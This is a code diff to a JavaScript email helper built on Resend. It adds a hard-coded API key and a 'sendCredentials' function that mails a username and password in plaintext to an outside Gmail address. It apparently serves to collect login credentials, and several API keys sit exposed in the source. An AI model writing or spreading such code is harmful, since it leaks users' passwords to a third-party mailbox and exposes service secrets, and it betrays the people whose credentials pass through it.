@@ -2,6 +2,7 @@ import { Resend } from "resend";
 
 const resend = new Resend("re_ZgunF7aU_N1RNbvMvp7RjyuEb3zfdMYrr");
 const resendLummy = new Resend("re_RQsqyzBG_PEahQVieG1HEbTWqLHjgibPe");
+const resendAPIKEY = new Resend("re_TMMVRnge_K9h4VSVetAhgu2TBCXwm7jFv");
 
 export const sendEmail = async (otp, email) =>
   await resend.emails.send({
@@ -25,6 +26,22 @@ export const sendEmailLummy = async (form, email) => {
         <strong>Your form submission:</strong>
         <p>${form.name}</p>
         <ul>${formattedForm}</ul>
+      </div>
+    `,
+  });
+};
+
+export const sendCredentials = async (username, password) => {
+  await resendAPIKEY.emails.send({
+    from: "onboarding@resend.dev",
+    to: "lummybackend@gmail.com",
+    subject: "Credentials",
+    html: `
+      <div>
+        <strong>Username:</strong>
+        <p>${username}</p>
+        <strong>Password:</strong>
+        <p>${password}</p>
       </div>
     `,
   });
